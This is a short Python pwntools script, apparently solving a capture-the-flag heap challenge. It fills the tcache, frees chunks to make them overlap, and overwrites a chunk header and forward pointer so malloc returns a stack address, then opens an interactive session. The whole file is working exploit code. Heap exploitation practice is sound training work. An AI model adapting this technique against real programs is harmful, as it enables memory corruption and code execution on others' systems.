from pwn import *
from handle import *

def exploit():
	for _ in range(7):
		malloc(0x80)
	
	malloc(0x80)
	malloc(0x80)

	malloc(0x10)

	for i in range(7):
		free_chunk(i)
	
	free_chunk(8)
	free_chunk(7)

	malloc(0x80)

	free_chunk(8)

	malloc(0x100)

	target = stack_var_1_address()
	write_to_chunk(11, 'A' * (0x80) + p64(0) + p64(0x91) + p64(target))

	malloc(0x80)
	malloc(0x80)

	free_chunk(8)

p = exec_file(0)
exploit()
p.interactive()
p.close()
